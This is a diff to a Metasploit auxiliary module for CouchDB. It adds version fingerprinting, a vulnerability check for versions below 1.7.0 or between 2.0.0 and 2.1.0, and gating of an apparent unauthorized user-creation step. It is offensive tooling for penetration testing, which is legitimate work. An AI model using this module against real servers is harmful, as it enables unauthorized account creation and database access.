@@ -45,6 +45,57 @@ class MetasploitModule < Msf::Auxiliary
     return res.code == 200 && res.headers['Server'].include?('CouchDB')
   end
 
+  def get_version
+    @version = nil
+
+    begin
+      res = send_request_cgi(
+        'uri'           => normalize_uri("/"),
+        'method'        => 'GET',
+        'authorization' => @auth
+      )
+    rescue Rex::ConnectionError
+      vprint_bad("#{peer} - Connection failed")
+      return false
+    end
+
+    unless res
+      vprint_bad("#{peer} - No response, check if it is CouchDB. ")
+      return false
+    end
+
+    if res && res.code == 401
+      print_bad("#{peer} - Authentication required.")
+      return false
+    end
+
+    if res && res.code == 200
+      res_json = res.get_json_document
+
+      if res_json.empty?
+        vprint_bad("#{peer} - Cannot parse the response, seems like it's not CouchDB.")
+        return false
+      end
+
+      @version = res_json['version'] if res_json['version']
+      return true
+    end
+
+    vprint_warning("#{peer} - Version not found")
+    return true
+  end
+
+  def check
+    get_version
+    version = Gem::Version.new(@version)
+    return CheckCode::Unknown if version.version.empty?
+    vprint_status "Found CouchDB version #{version}"
+
+    return CheckCode::Appears if version < Gem::Version.new('1.7.0') || version.between?(Gem::Version.new('2.0.0'), Gem::Version.new('2.1.0'))
+
+    CheckCode::Safe
+  end
+
   def get_dbs(auth)
     begin
       res = send_request_cgi(
@@ -136,6 +187,7 @@ class MetasploitModule < Msf::Auxiliary
     roles = datastore['ROLES']
     timeout = datastore['TIMEOUT']
     uripath = datastore['URIPATH']
+    version = @version
 
     data = "{
 \"type\": \"user\",
@@ -167,7 +219,10 @@ class MetasploitModule < Msf::Auxiliary
       get_server_info(auth)
     end
     if datastore['CREATEUSER']
-      create_user
+      get_version
+      version = Gem::Version.new(@version)
+      print_good "Found CouchDB version #{version}"
+      create_user if version < Gem::Version.new('1.7.0') || version.between?(Gem::Version.new('2.0.0'), Gem::Version.new('2.1.0'))
     end
     get_dbs(auth)
   end
